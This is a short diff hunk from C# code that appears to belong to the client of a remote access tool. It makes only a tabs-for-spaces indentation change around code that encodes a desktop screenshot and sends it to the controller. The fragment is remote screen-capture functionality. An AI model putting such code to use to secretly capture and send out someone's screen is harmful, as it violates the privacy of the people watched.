@@ -233,19 +233,19 @@ namespace xClient.Core.Commands
 
 			using (MemoryStream stream = new MemoryStream())
 			{
-                try
-                {
-                    StreamCodec.CodeImage(bmpdata.Scan0,
-                        new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
-                        new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), LastDesktopScreenshot.PixelFormat,
-                        stream);
-                    new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
-                }
-                catch
-                {
-                    new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
-                    StreamCodec = null;
-                }
+				try
+				{
+					StreamCodec.CodeImage(bmpdata.Scan0,
+						new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height),
+						new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), LastDesktopScreenshot.PixelFormat,
+						stream);
+					new Packets.ClientPackets.DesktopResponse(stream.ToArray(), StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
+				}
+				catch
+				{
+					new Packets.ClientPackets.DesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor).Execute(client);
+					StreamCodec = null;
+				}
 			}
 
 			LastDesktopScreenshot.UnlockBits(bmpdata);
